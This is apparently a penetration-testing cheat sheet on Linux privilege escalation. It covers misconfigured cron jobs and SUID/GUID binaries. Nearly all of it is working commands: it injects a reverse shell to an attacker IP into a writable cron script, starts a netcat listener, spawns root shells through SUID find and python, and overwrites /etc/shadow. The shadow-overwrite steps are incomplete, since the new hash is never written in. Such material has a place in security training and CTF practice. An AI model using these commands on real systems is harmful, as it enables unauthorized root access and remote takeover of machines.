# Cron, SUID & GUID Exploitation

!!! tip "Tip"
    For SUID binaries, check GTFOBins first before writing custom exploits — most common binaries have documented privesc paths. For cron, check if the script is writable OR if any directory in its path is writable (path injection).

!!! warning "Watch out"
    SUID on custom binaries (not standard Linux utils) is a red flag — these are often intentional CTF vectors. In real engagements, SUID on non-standard binaries can indicate misconfiguration worth investigating.

---

## Exploiting Cron Jobs

### Identify Misconfigured Cron Jobs

```bash
cat /etc/crontab
ls -lah /etc/cron.*
find /etc/cron* -writable -type f 2>/dev/null
```

### Exploit a Writable Cron Script

1. Confirm write access:

    ```bash
    ls -lah /home/joe/.scripts/user_backups.sh
    ```

2. Inject a reverse shell:

    ```bash
    echo "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1" >> /home/joe/.scripts/user_backups.sh
    ```

3. Start listener:

    ```bash
    nc -lvnp 4444
    ```

---

## Exploiting SUID and GUID Binaries

### Identify SUID/GUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null       # SUID binaries
find / -perm -u=s -o -perm -g=s 2>/dev/null  # SUID or GUID
find / -writable -type d 2>/dev/null          # Writable directories
```

### Exploit SUID Binaries

If `find` has SUID:

```bash
find . -exec /bin/sh -p \; -quit
```

If `python` has SUID:

```bash
python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

---

## Exploiting SUID via File Overwrite

If `cp` or `tar` has SUID, overwrite `/etc/shadow`:

1. Generate a new password hash:

    ```bash
    openssl passwd -1 -salt xyz P@ssw0rd
    ```

2. Copy and modify `/etc/shadow`:

    ```bash
    cp /etc/shadow /tmp/shadow.bak
    ```

3. Replace `/etc/shadow` with modified version:

    ```bash
    cp /tmp/shadow.bak /etc/shadow
    ```

4. Switch to root:

    ```bash
    su root
    ```
